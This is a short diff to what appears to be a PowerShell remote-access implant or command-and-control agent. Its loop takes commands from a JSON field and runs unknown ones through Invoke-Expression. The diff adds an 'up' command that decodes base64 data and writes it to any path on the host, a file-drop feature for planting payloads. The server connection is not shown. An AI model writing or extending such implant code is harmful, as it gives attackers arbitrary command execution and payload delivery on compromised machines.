@@ -97,6 +97,18 @@ while ($True) {
 			}
 		}
 
+		elseif($jsObject['cmnd'].split(" ")[0] -eq "up") {
+			try {
+				$filepath = $jsObject['cmnd'].split(" ")[2..99] -join " "
+				$content = [Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1])
+				[IO.File]::WriteAllBytes($filepath, $content)
+				$retval = "[*] File uploaded: $filepath"
+			}
+			catch {
+				$retval = "[-] Could not upload file: $filepath"
+			}
+		}
+
 		else {
 			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
 			if($err) {
